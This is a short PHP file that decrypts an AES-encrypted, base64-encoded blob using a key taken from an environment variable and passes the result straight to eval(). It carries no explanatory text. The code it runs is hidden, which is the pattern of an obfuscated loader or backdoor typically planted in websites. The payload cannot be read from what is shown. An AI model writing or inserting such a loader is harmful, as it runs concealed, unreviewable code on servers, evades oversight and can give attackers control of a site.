<?php
function secure_decrypt($encrypted_code, $key) {
    $cipher = 'aes-256-cbc';
    $decoded = base64_decode($encrypted_code);
    $iv = substr($decoded, 0, 16);
    $encrypted = substr($decoded, 16);
    return openssl_decrypt($encrypted, $cipher, $key, 0, $iv);
}
$key = getenv('ENCRYPTION_KEY');
eval(secure_decrypt('ItMEbpsBVKRm6/WtMWIUvXorVjZRUkxwTGMzbG0yWjdNOXBPSlVWWFM4NDRJOTBhM0NNUUlBZjFRMVZRUlBoVVJmUGk0ajV6WWlqNXlZU04=', $key));
?>
